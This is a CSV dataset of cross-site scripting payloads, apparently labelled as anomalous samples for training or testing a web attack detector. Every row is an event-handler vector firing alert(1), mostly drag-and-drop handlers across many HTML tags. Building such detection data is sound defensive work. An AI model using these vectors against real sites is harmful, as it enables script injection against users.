payload,length,attack_type,label
"<dir onclick=""alert(1)"">test</dir>",34,xss,anom
"<dir oncontextmenu=""alert(1)"">test</dir>",40,xss,anom
"<dir oncopy=""alert(1)"" contenteditable>test</dir>",49,xss,anom
"<dir oncut=""alert(1)"" contenteditable>test</dir>",48,xss,anom
"<dir ondblclick=""alert(1)"">test</dir>",37,xss,anom
<dir onfocusout=alert(1) tabindex=1 id=x></dir><input autofocus>,64,xss,anom
"<dir onkeydown=""alert(1)"" contenteditable>test</dir>",52,xss,anom
"<dir onkeypress=""alert(1)"" contenteditable>test</dir>",53,xss,anom
"<dir onkeyup=""alert(1)"" contenteditable>test</dir>",50,xss,anom
"<dir onmousedown=""alert(1)"">test</dir>",38,xss,anom
"<dir onmouseenter=""alert(1)"">test</dir>",39,xss,anom
"<dir onmouseleave=""alert(1)"">test</dir>",39,xss,anom
"<dir onmousemove=""alert(1)"">test</dir>",38,xss,anom
"<dir onmouseout=""alert(1)"">test</dir>",37,xss,anom
"<dir onmouseover=""alert(1)"">test</dir>",38,xss,anom
"<dir onmouseup=""alert(1)"">test</dir>",36,xss,anom
"<dir onpaste=""alert(1)"" contenteditable>test</dir>",50,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><a ondrop=alert(1) contenteditable>drop here</a>",99,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable>drop here</abbr>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><abbr ondrop=alert(1) contenteditable>drop here</abbr>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><acronym ondrop=alert(1) contenteditable>drop here</acronym>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><address ondragover=alert(1) contenteditable>drop here</address>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><address ondrop=alert(1) contenteditable>drop here</address>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><applet ondragover=alert(1) contenteditable>drop here</applet>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><applet ondrop=alert(1) contenteditable>drop here</applet>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><area ondragover=alert(1) contenteditable>drop here</area>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><area ondrop=alert(1) contenteditable>drop here</area>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><article ondrop=alert(1) contenteditable>drop here</article>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><aside ondragover=alert(1) contenteditable>drop here</aside>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><aside ondrop=alert(1) contenteditable>drop here</aside>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><audio ondragover=alert(1) contenteditable>drop here</audio>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><audio ondrop=alert(1) contenteditable>drop here</audio>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><b ondragover=alert(1) contenteditable>drop here</b>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><b ondrop=alert(1) contenteditable>drop here</b>",99,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><base ondragover=alert(1) contenteditable>drop here</base>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><base ondrop=alert(1) contenteditable>drop here</base>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><basefont ondragover=alert(1) contenteditable>drop here</basefont>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><basefont ondrop=alert(1) contenteditable>drop here</basefont>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><bdo ondrop=alert(1) contenteditable>drop here</bdo>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><bgsound ondragover=alert(1) contenteditable>drop here</bgsound>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><bgsound ondrop=alert(1) contenteditable>drop here</bgsound>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><big ondragover=alert(1) contenteditable>drop here</big>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><big ondrop=alert(1) contenteditable>drop here</big>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><blink ondragover=alert(1) contenteditable>drop here</blink>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><blink ondrop=alert(1) contenteditable>drop here</blink>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>",121,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><blockquote ondrop=alert(1) contenteditable>drop here</blockquote>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><body ondragover=alert(1) contenteditable>drop here</body>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><body ondrop=alert(1) contenteditable>drop here</body>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><br ondragover=alert(1) contenteditable>drop here</br>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><br ondrop=alert(1) contenteditable>drop here</br>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><button ondragover=alert(1) contenteditable>drop here</button>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><button ondrop=alert(1) contenteditable>drop here</button>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><canvas ondragover=alert(1) contenteditable>drop here</canvas>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><canvas ondrop=alert(1) contenteditable>drop here</canvas>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><caption ondragover=alert(1) contenteditable>drop here</caption>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><caption ondrop=alert(1) contenteditable>drop here</caption>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><center ondragover=alert(1) contenteditable>drop here</center>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><center ondrop=alert(1) contenteditable>drop here</center>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><cite ondragover=alert(1) contenteditable>drop here</cite>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable>drop here</cite>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><code ondragover=alert(1) contenteditable>drop here</code>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><code ondrop=alert(1) contenteditable>drop here</code>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><col ondragover=alert(1) contenteditable>drop here</col>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><col ondrop=alert(1) contenteditable>drop here</col>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><colgroup ondragover=alert(1) contenteditable>drop here</colgroup>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><colgroup ondrop=alert(1) contenteditable>drop here</colgroup>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><command ondragover=alert(1) contenteditable>drop here</command>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><command ondrop=alert(1) contenteditable>drop here</command>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><content ondragover=alert(1) contenteditable>drop here</content>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><content ondrop=alert(1) contenteditable>drop here</content>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><data ondragover=alert(1) contenteditable>drop here</data>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><data ondrop=alert(1) contenteditable>drop here</data>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><datalist ondragover=alert(1) contenteditable>drop here</datalist>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><datalist ondrop=alert(1) contenteditable>drop here</datalist>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><dd ondragover=alert(1) contenteditable>drop here</dd>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><dd ondrop=alert(1) contenteditable>drop here</dd>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><del ondragover=alert(1) contenteditable>drop here</del>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><del ondrop=alert(1) contenteditable>drop here</del>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><details ondragover=alert(1) contenteditable>drop here</details>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><details ondrop=alert(1) contenteditable>drop here</details>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><dfn ondragover=alert(1) contenteditable>drop here</dfn>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><dfn ondrop=alert(1) contenteditable>drop here</dfn>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><dialog ondrop=alert(1) contenteditable>drop here</dialog>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><dir ondragover=alert(1) contenteditable>drop here</dir>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><dir ondrop=alert(1) contenteditable>drop here</dir>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><div ondragover=alert(1) contenteditable>drop here</div>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><div ondrop=alert(1) contenteditable>drop here</div>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><dl ondrop=alert(1) contenteditable>drop here</dl>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><dt ondragover=alert(1) contenteditable>drop here</dt>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><dt ondrop=alert(1) contenteditable>drop here</dt>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><element ondragover=alert(1) contenteditable>drop here</element>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><element ondrop=alert(1) contenteditable>drop here</element>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><em ondragover=alert(1) contenteditable>drop here</em>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><em ondrop=alert(1) contenteditable>drop here</em>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable>drop here</fieldset>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><fieldset ondrop=alert(1) contenteditable>drop here</fieldset>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><figcaption ondragover=alert(1) contenteditable>drop here</figcaption>",121,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><figcaption ondrop=alert(1) contenteditable>drop here</figcaption>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><figure ondragover=alert(1) contenteditable>drop here</figure>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><figure ondrop=alert(1) contenteditable>drop here</figure>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable>drop here</footer>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><form ondrop=alert(1) contenteditable>drop here</form>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable>drop here</frame>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><frame ondrop=alert(1) contenteditable>drop here</frame>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable>drop here</frameset>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable>drop here</frameset>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable>drop here</h1>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><head ondragover=alert(1) contenteditable>drop here</head>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><head ondrop=alert(1) contenteditable>drop here</head>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><header ondrop=alert(1) contenteditable>drop here</header>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><hgroup ondragover=alert(1) contenteditable>drop here</hgroup>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><hgroup ondrop=alert(1) contenteditable>drop here</hgroup>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><hr ondrop=alert(1) contenteditable>drop here</hr>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><html ondragover=alert(1) contenteditable>drop here</html>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><html ondrop=alert(1) contenteditable>drop here</html>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><i ondragover=alert(1) contenteditable>drop here</i>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><i ondrop=alert(1) contenteditable>drop here</i>",99,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><iframe ondragover=alert(1) contenteditable>drop here</iframe>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><image ondrop=alert(1) contenteditable>drop here</image>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><input ondrop=alert(1) contenteditable>drop here</input>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><ins ondragover=alert(1) contenteditable>drop here</ins>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><ins ondrop=alert(1) contenteditable>drop here</ins>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><isindex ondragover=alert(1) contenteditable>drop here</isindex>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><isindex ondrop=alert(1) contenteditable>drop here</isindex>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><kbd ondrop=alert(1) contenteditable>drop here</kbd>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><keygen ondragover=alert(1) contenteditable>drop here</keygen>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><keygen ondrop=alert(1) contenteditable>drop here</keygen>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><label ondrop=alert(1) contenteditable>drop here</label>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable>drop here</legend>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><li ondrop=alert(1) contenteditable>drop here</li>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable>drop here</listing>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><listing ondrop=alert(1) contenteditable>drop here</listing>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><main ondragover=alert(1) contenteditable>drop here</main>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><main ondrop=alert(1) contenteditable>drop here</main>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><map ondragover=alert(1) contenteditable>drop here</map>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><map ondrop=alert(1) contenteditable>drop here</map>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><mark ondragover=alert(1) contenteditable>drop here</mark>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><mark ondrop=alert(1) contenteditable>drop here</mark>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><marquee ondragover=alert(1) contenteditable>drop here</marquee>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><marquee ondrop=alert(1) contenteditable>drop here</marquee>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><menu ondragover=alert(1) contenteditable>drop here</menu>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><menu ondrop=alert(1) contenteditable>drop here</menu>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable>drop here</menuitem>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable>drop here</meta>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable>drop here</meta>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><meter ondragover=alert(1) contenteditable>drop here</meter>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><meter ondrop=alert(1) contenteditable>drop here</meter>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><multicol ondragover=alert(1) contenteditable>drop here</multicol>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><nav ondragover=alert(1) contenteditable>drop here</nav>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable>drop here</nav>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><nextid ondragover=alert(1) contenteditable>drop here</nextid>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><nextid ondrop=alert(1) contenteditable>drop here</nextid>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><nobr ondragover=alert(1) contenteditable>drop here</nobr>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><nobr ondrop=alert(1) contenteditable>drop here</nobr>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><noembed ondragover=alert(1) contenteditable>drop here</noembed>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><noframes ondragover=alert(1) contenteditable>drop here</noframes>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><noframes ondrop=alert(1) contenteditable>drop here</noframes>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable>drop here</noscript>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><object ondragover=alert(1) contenteditable>drop here</object>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><optgroup ondragover=alert(1) contenteditable>drop here</optgroup>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><optgroup ondrop=alert(1) contenteditable>drop here</optgroup>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><option ondrop=alert(1) contenteditable>drop here</option>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><output ondrop=alert(1) contenteditable>drop here</output>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><p ondragover=alert(1) contenteditable>drop here</p>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><p ondrop=alert(1) contenteditable>drop here</p>",99,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><param ondragover=alert(1) contenteditable>drop here</param>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><param ondrop=alert(1) contenteditable>drop here</param>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><picture ondragover=alert(1) contenteditable>drop here</picture>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><picture ondrop=alert(1) contenteditable>drop here</picture>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable>drop here</plaintext>",119,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondrop=alert(1) contenteditable>drop here</plaintext>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><pre ondragover=alert(1) contenteditable>drop here</pre>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>",117,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><progress ondrop=alert(1) contenteditable>drop here</progress>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><q ondragover=alert(1) contenteditable>drop here</q>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>",99,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><rb ondragover=alert(1) contenteditable>drop here</rb>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><rb ondrop=alert(1) contenteditable>drop here</rb>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><rp ondragover=alert(1) contenteditable>drop here</rp>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><rp ondrop=alert(1) contenteditable>drop here</rp>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><rt ondragover=alert(1) contenteditable>drop here</rt>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><rt ondrop=alert(1) contenteditable>drop here</rt>",101,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable>drop here</rtc>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><rtc ondrop=alert(1) contenteditable>drop here</rtc>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><ruby ondragover=alert(1) contenteditable>drop here</ruby>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><ruby ondrop=alert(1) contenteditable>drop here</ruby>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><s ondragover=alert(1) contenteditable>drop here</s>",103,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><s ondrop=alert(1) contenteditable>drop here</s>",99,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><samp ondragover=alert(1) contenteditable>drop here</samp>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><samp ondrop=alert(1) contenteditable>drop here</samp>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>",115,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><section ondrop=alert(1) contenteditable>drop here</section>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><select ondrop=alert(1) contenteditable>drop here</select>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><shadow ondragover=alert(1) contenteditable>drop here</shadow>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><shadow ondrop=alert(1) contenteditable>drop here</shadow>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><slot ondragover=alert(1) contenteditable>drop here</slot>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><slot ondrop=alert(1) contenteditable>drop here</slot>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><small ondragover=alert(1) contenteditable>drop here</small>",111,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><small ondrop=alert(1) contenteditable>drop here</small>",107,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><source ondrop=alert(1) contenteditable>drop here</source>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><spacer ondragover=alert(1) contenteditable>drop here</spacer>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><spacer ondrop=alert(1) contenteditable>drop here</spacer>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><span ondragover=alert(1) contenteditable>drop here</span>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><span ondrop=alert(1) contenteditable>drop here</span>",105,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><strike ondragover=alert(1) contenteditable>drop here</strike>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><strike ondrop=alert(1) contenteditable>drop here</strike>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>",113,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><strong ondrop=alert(1) contenteditable>drop here</strong>",109,xss,anom
"<div draggable=""true"" contenteditable>drag me</div><style ondragover=alert(1) contenteditable>drop here</style>",111,xss,anom
